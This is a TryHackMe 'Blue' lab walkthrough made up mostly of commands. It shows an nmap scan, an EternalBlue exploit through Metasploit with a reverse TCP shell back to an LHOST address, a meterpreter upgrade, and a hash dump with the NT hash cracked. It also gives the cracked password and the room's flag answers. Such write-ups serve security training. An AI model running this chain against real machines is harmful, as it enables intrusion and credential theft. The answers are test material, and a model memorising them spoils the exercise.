# THM - Blue

<br>

## Task 1

```shell
mkdir nmap
nmap -sV -sC --script vuln -oN nmap/initial -p- 10.10.30.144
```

### Task 1.2

> 3

### Task 1.3

> ms17-010

<br>

## Task 2

```shell
msfconsole
```

### Task 2.2

```shell
	search ms17-010
```

> exploit/windows/smb/ms17_010_eternalblue

### Task 2.3

```shell
	use exploit/windows/smb/ms17_010_eternalblue
		show options
		set RHOSTS 10.10.129.98
		set LHOST 10.14.27.197
```

> RHOSTS

```shell
		set payload windows/x64/shell/reverse_tcp
		
		run
		
			^Z
			y
```

<br>

## Task 3

### Task 3.1

🧰 https://www.hackingarticles.in/command-shell-to-meterpreter/

> post/multi/manage/shell_to_meterpreter

### Task 3.2

```shell
		back
	use post/multi/manage/shell_to_meterpreter
		show options
```

> SESSION

```shell
		sessions -l
		set SESSION 1
		
		run
		
		sessions
		sessions -i 2
			
			getuid
			
			ps
			
			migrate 1324
```

<br>

## Task 4

### Task 4.1

```shell
			hashdump
```

> Jon

### Task 4.2

```shell
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
```

🧰 https://crackstation.net/

OR:
```shell
john hash.txt --format=NT --wordlist=../../Tools/KaliWordlists/rockyou.txt
```

> alqfna22

<br>

## Task 5

### Task 5.1

```shell
			pwd
			cd ../../
			ls
			cat flag1.txt
```

> flag{access_the_machine}

### Task 5.2

```shell
			cd Windows/system32/config/
			ls
			cat flag2.txt
```

> flag{sam_database_elevated_access}

### Task 5.3

```shell
			search -f "flag3.txt"
			cd ../../../Users/Jon/Documents/
			cat flag3.txt
```

> flag{admin_documents_can_be_valuable}

<br>

